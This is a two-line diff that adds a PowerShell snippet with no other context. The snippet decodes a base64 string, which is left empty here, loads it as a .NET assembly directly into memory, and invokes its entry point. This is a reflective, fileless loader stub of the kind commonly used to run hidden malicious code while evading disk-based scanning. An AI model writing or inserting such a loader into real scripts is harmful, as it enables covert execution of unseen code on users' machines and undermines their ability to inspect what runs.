@@ -1,0 +1,2 @@
+$CodePayloadB64 = ""
+[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String($CodePayloadB64)).EntryPoint.invoke($null,$null)
